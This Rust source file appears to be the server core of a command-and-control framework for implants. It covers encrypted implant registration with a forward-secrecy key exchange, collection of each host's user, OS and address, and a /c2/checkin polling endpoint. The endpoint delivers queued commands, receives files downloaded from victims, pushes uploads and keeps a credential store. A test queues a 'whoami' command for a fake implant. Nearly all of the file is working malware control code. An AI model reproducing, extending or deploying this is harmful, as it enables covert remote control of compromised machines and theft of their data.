use std::sync::Arc;

use axum::{Router, extract::State, routing::post};
use nw_profile::{
    crypto,
    envelope::{Envelope, Kind},
    msgs::{FileAck, PollReply, PollRequest, Register, RegisterAck},
};

use crate::queue::SharedQueue;
use crate::server::ServerState;
use crate::session::SharedRegistry;

fn derive_session_key(psk: &[u8]) -> [u8; crypto::KEY_LEN] {
    crypto::derive_key(psk, b"nw-m1-salt")
}

fn decode_key(s: &str) -> Result<[u8; 32], ()> {
    use base64::Engine;
    let raw = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|_| ())?;
    <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| ())
}

fn encode_key(k: &[u8; 32]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(k)
}

/// Cryptographic wrappers for one session key.
struct Cipher {
    key: [u8; crypto::KEY_LEN],
}
impl Cipher {
    fn new(key: [u8; crypto::KEY_LEN]) -> Self {
        Cipher { key }
    }
    fn unwrap(&self, id: u64, b64: &str) -> Result<Vec<u8>, crypto::CryptoError> {
        crypto::decrypt(&self.key, id, b64)
    }
}

/// Central C2 envelope dispatch shared by every transport (HTTP + TCP + DNS).
/// Takes an inbound envelope and returns the reply, or an error mapped to a
/// status for the transport to surface.
pub async fn process(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
    match env.kind {
        Kind::Register => process_register(state, env).await,
        Kind::TaskResult => process_poll(state, env).await,
        Kind::Heartbeat => process_poll(state, env).await,
        _ => Err(C2Error::BadRequest),
    }
}

#[derive(Debug)]
pub enum C2Error {
    BadRequest,
    Unauthorized,
    Internal(String),
}

async fn process_register(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
    if env.session_id.is_some() {
        return Err(C2Error::BadRequest);
    }
    // The register handshake is authenticated with the PSK-derived key; this is
    // what ties the implant to the shared secret before any session key exists.
    let cipher = Cipher::new(derive_session_key(&state.psk));
    let pt = cipher
        .unwrap(env.id, &env.encrypted)
        .map_err(|_| C2Error::Unauthorized)?;
    let reg: Register = serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;

    // Forward-secrecy handshake: each side rolls an ephemeral x25519 key and
    // DHs them inside the PSK-authenticated register/ack exchange. The derived
    // key is unique per registration and unused by any other session, so
    // compromising a session key (or the PSK later) does not reveal traffic
    // under a different session key.
    let implant_pub = decode_key(&reg.session_key).map_err(|_| C2Error::BadRequest)?;
    let server_kp = crypto::KeyPair::generate();
    let shared = server_kp
        .shared_secret(&implant_pub)
        .map_err(|_| C2Error::Unauthorized)?;
    let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

    let sid = state
        .registry
        .create(
            reg.hostname,
            reg.username,
            reg.os,
            reg.arch,
            reg.pid,
            reg.addr,
            session_key,
        )
        .await;

    let ack = RegisterAck {
        session_id: sid,
        server_pub: encode_key(&server_kp.public_key()),
    };
    let reply_id = env.id + 1;
    let plaintext =
        serde_json::to_vec(&ack).map_err(|_| C2Error::Internal("serialize ack".into()))?;
    // The ack is contained in the PSK-sealed register reply, so the implant can
    // decrypt it before it has derived the DH session key. The session key
    // encrypts only subsequent (poll) traffic.
    let out = crypto::encrypt(&derive_session_key(&state.psk), reply_id, &plaintext)
        .map_err(|_| C2Error::Internal("encrypt ack".into()))?;
    Ok(Envelope::new(Kind::RegisterAck, reply_id, Some(sid), out))
}

async fn process_poll(state: &ServerState, env: Envelope) -> Result<Envelope, C2Error> {
    let Some(sid) = env.session_id else {
        return Err(C2Error::BadRequest);
    };
    let Some(session) = state.registry.get(&sid).await else {
        return Err(C2Error::Unauthorized);
    };
    let cipher = Cipher::new(session.key);
    let pt = cipher
        .unwrap(env.id, &env.encrypted)
        .map_err(|_| C2Error::Unauthorized)?;
    let req: PollRequest = serde_json::from_slice(&pt).map_err(|_| C2Error::BadRequest)?;

    // Deliver completed results, then drain pending tasks.
    for r in req.results {
        state.queue.deliver_result(&sid, r).await;
    }
    // Persist any file download chunks and collect resume acks.
    let mut acks: Vec<FileAck> = Vec::new();
    for chunk in &req.file_chunks {
        acks.push(state.files.write_chunk(&sid, chunk));
    }
    // Server->implant upload: apply acks and build push chunks to this beacon's
    // transport budget.
    for ack in &req.upload_acks {
        state.uploads.apply_ack(&sid, ack.received, ack.done);
    }
    let push_chunks = state.uploads.push_budget(&sid, req.inner_budget);
    state.registry.touch(&sid).await;
    let pending = state.queue.drain(&sid).await;

    let reply = PollReply {
        tasks: pending,
        acks,
        push_chunks,
    };
    let reply_id = env.id + 1;
    let plaintext =
        serde_json::to_vec(&reply).map_err(|_| C2Error::Internal("serialize reply".into()))?;
    let out = crypto::encrypt(&session.key, reply_id, &plaintext)
        .map_err(|_| C2Error::Internal("encrypt reply".into()))?;
    // Kind::Task if we have work, else Heartbeat to save the implant a check.
    let kind = if reply.tasks.is_empty() {
        Kind::Heartbeat
    } else {
        Kind::Task
    };
    Ok(Envelope::new(kind, reply_id, Some(sid), out))
}

fn to_status(e: C2Error) -> axum::http::StatusCode {
    match e {
        C2Error::BadRequest => axum::http::StatusCode::BAD_REQUEST,
        C2Error::Unauthorized => axum::http::StatusCode::UNAUTHORIZED,
        C2Error::Internal(_) => axum::http::StatusCode::INTERNAL_SERVER_ERROR,
    }
}

/// Open a sealed inbound frame, dispatch it, and re-seal the reply. The clear
/// routing `session_id` selects the per-session DH key; a frame without one is
/// a pre-registration register, which uses the PSK-derived key.
pub async fn process_sealed(state: &ServerState, wire: &[u8]) -> Result<Vec<u8>, C2Error> {
    let wire_str = std::str::from_utf8(wire).map_err(|_| C2Error::BadRequest)?;
    // Peek the clear routing id; None => register (PSK key), Some => session.
    let in_key = match Envelope::routing_id(wire_str) {
        None => derive_session_key(&state.psk),
        Some(sid) => resolve_session_key(state, &sid).await?,
    };
    let env = Envelope::open(&in_key, wire_str).map_err(|_| C2Error::Unauthorized)?;
    let reply = process(state, env).await?;
    // The reply rides the same key as the request it answers.
    let sealed = reply
        .seal(&in_key)
        .map_err(|_| C2Error::Internal("seal reply".into()))?;
    Ok(sealed.into_bytes())
}

async fn resolve_session_key(
    state: &ServerState,
    sid: &uuid::Uuid,
) -> Result<[u8; crypto::KEY_LEN], C2Error> {
    state
        .registry
        .get(sid)
        .await
        .map(|s| s.key)
        .ok_or(C2Error::Unauthorized)
}

async fn checkin_http(
    State(state): State<ServerState>,
    body: axum::body::Bytes,
) -> Result<axum::body::Bytes, axum::http::StatusCode> {
    process_sealed(&state, &body)
        .await
        .map(axum::body::Bytes::from)
        .map_err(to_status)
}

/// Build the C2 HTTP router over the given shared state, preserving every
/// field (notably the crash-less FileStore) of `state`.
pub fn application(state: ServerState) -> Router {
    Router::new()
        .route("/c2/checkin", post(checkin_http))
        .with_state(state)
}

/// Build the C2 HTTP router over the given shared state.
pub fn router(registry: SharedRegistry, queue: SharedQueue, psk: Vec<u8>) -> Router {
    let state = ServerState {
        registry,
        queue,
        psk: Arc::new(psk),
        files: crate::filestore::FileStore::default(),
        uploads: crate::uploadstore::UploadStore::default(),
        creds: Arc::new(crate::creds::CredentialStore::new_in_memory()),
    };
    application(state)
}

/// Convenience for tests: register returns ack body.
#[allow(dead_code)]
fn _unused() {}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::session::SessionRegistry;
    use axum::body::Body;
    use axum::http::{Request, StatusCode};
    use tower::ServiceExt;

    fn test_state() -> (ServerState, SharedQueue) {
        let reg = Arc::new(SessionRegistry::new());
        let q = Arc::new(crate::queue::TaskQueue::new());
        let state = ServerState {
            registry: reg,
            queue: q.clone(),
            psk: Arc::new(b"test-psk".to_vec()),
            files: crate::filestore::FileStore::new(
                std::env::temp_dir().join(format!("nw-test-files-{}", std::process::id())),
            ),
            uploads: crate::uploadstore::UploadStore::default(),
            creds: Arc::new(crate::creds::CredentialStore::new_in_memory()),
        };
        (state, q)
    }

    #[test]
    fn derive_is_stable() {
        assert_eq!(derive_session_key(b"a"), derive_session_key(b"a"));
        assert_ne!(derive_session_key(b"a"), derive_session_key(b"b"));
    }

    #[tokio::test]
    async fn register_then_poll_round_trip() {
        let (state, q) = test_state();
        let app = router(state.registry.clone(), q.clone(), b"test-psk".to_vec());
        let psk_key = derive_session_key(b"test-psk");

        // register: seal the whole frame, POST to the single /c2/checkin.
        let implant_kp = crypto::KeyPair::generate();
        let reg = nw_profile::msgs::Register {
            hostname: "box".into(),
            username: "alice".into(),
            os: "linux".into(),
            arch: "x86_64".into(),
            pid: 42,
            addr: "10.0.0.5".into(),
            os_version: None,
            executable_path: None,
            local_addr: None,
            implant_version: None,
            interval_ms: None,
            jitter_ms: None,
            capabilities: None,
            session_key: base64_encode(&implant_kp.public_key()),
        };
        let reg_plain = serde_json::to_vec(&reg).unwrap();
        let reg_ct = crypto::encrypt(&psk_key, 1, &reg_plain).unwrap();
        let env = Envelope::new(Kind::Register, 1, None, reg_ct);
        let body = env.seal(&psk_key).unwrap().into_bytes();
        let resp = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/checkin")
                    .header("content-type", "application/octet-stream")
                    .body(Body::from(body))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let ack_wire = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .unwrap();
        let ack_wire = std::str::from_utf8(&ack_wire).unwrap();
        // The ack reply is sealed with the PSK key (register phase).
        let ack = Envelope::open(&psk_key, ack_wire).unwrap();
        let ack_pt = crypto::decrypt(&psk_key, 2, &ack.encrypted).unwrap();
        let ack_msg: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();

        // Derive the shared session key exactly as the implantation does, then
        // seal the poll under it (registration is complete).
        let server_pub = deb64(&ack_msg.server_pub).unwrap();
        let shared = implant_kp.shared_secret(&server_pub).unwrap();
        let session_key = crypto::derive_key(&shared, crypto::SESSION_SALT);

        // poll with a queued task
        q.push(&ack_msg.session_id, "whoami".into(), vec![], 1000)
            .await
            .unwrap();
        let poll_plain = serde_json::to_vec(&PollRequest::default()).unwrap();
        let poll_ct = crypto::encrypt(&session_key, 2, &poll_plain).unwrap();
        let poll_env = Envelope::new(Kind::TaskResult, 2, Some(ack_msg.session_id), poll_ct);
        let poll_body = poll_env.seal(&session_key).unwrap().into_bytes();
        let resp2 = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri("/c2/checkin")
                    .header("content-type", "application/octet-stream")
                    .body(Body::from(poll_body))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp2.status(), StatusCode::OK);
        let reply_wire = axum::body::to_bytes(resp2.into_body(), usize::MAX)
            .await
            .unwrap();
        let reply_wire = std::str::from_utf8(&reply_wire).unwrap();
        let reply = Envelope::open(&session_key, reply_wire).unwrap();
        // Poll reply envelope has id = request id + 1 -> 2 + 1 = 3.
        let reply_pt = crypto::decrypt(&session_key, 3, &reply.encrypted).unwrap();
        let pr: PollReply = serde_json::from_slice(&reply_pt).unwrap();
        assert_eq!(pr.tasks.len(), 1);
        assert_eq!(pr.tasks[0].command, "whoami");
    }

    fn base64_encode(b: &[u8; 32]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(b)
    }

    fn deb64(s: &str) -> Result<[u8; 32], ()> {
        use base64::Engine;
        let raw = base64::engine::general_purpose::STANDARD
            .decode(s)
            .map_err(|_| ())?;
        <[u8; 32]>::try_from(raw.as_slice()).map_err(|_| ())
    }
}
